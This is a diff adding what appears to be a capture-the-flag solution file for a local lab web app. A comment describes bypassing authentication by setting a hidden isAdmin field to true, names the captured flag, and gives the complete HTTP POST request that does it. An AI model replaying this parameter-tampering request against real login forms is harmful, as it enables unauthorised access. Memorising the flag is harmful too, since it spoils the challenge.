@@ -1,0 +1,8 @@
+# Authentication bypass by changing hidden field isAdmin from false to true. No valid credentials required. Yields flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}.
+
+POST /index.php HTTP/1.1
+Host: 172.17.0.1:58043
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+username=admin&password=admin&isAdmin=true
